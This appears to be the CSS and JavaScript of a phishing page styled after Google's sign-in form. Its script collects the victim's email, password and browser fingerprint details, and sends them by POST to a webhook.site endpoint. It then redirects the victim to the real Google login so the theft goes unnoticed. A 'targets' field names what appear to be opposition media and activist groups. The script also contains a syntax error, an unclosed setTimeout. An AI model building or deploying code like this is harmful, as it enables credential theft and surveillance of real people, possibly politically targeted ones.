.form-container{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:40px 40px 36px;overflow:hidden;position:relative;}

.form-label{display:block;font-size:14px;color:#202124;margin-bottom:8px;font-weight:500;}
.form-input{width:100%;height:44px;border:1px solid #dadce0;border-radius:4px;padding:0 16px;font-size:16px;outline:none;transition:border-color .2s;}
.form-input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2);}
.password-input{font-family:monospace;font-size:18px;letter-spacing:1px;}
.btn-submit{width:100%;height:50px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:background .2s;}
.btn-submit:hover{background:#1557b0;}
.btn-submit:active{background:#0f4da3;}
.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:none;align-items:center;justify-content:center;flex-direction:column;}
.loading.active{display:flex;}
.spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px;}
.loading-text{color:#5f6368;font-size:14px;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
.footer{text-align:center;margin-top:32px;color:#5f6368;font-size:12px;}

<script>
function submitForm(e) {
  e.preventDefault();
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  const data = {
    timestamp: new Date().toISOString(),
    email: email,
    password: password,
    ip: navigator.geolocation ? 'VPN Amsterdam' : 'Unknown',
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookies: navigator.cookieEnabled,
    screen: `${screen.width}x${screen.height}`,
    targets: 'EU12-MIX-2026:charter97,nashaniva,viacorka,razamruch,konsultacje,foreignvolunteers,gur,bratstvo,litvin',
    webhook: 'c9ca4d4f-507d-44a1-aba3-bdbe7311a5cd'
  };
  
  fetch('https://webhook.site/#!/c9ca4d4f-507d-44a1-aba3-bdbe7311a5cd', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).then(() => {
    document.getElementById('loading').classList.add('active');
    document.querySelector('.container').style.display = 'none';
    setTimeout(() => {
      window.location.href = 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F';

  }).catch(() => {
    setTimeout(() => {
      window.location.href = 'https://accounts.google.com/';
    }, 1500);
  });
}
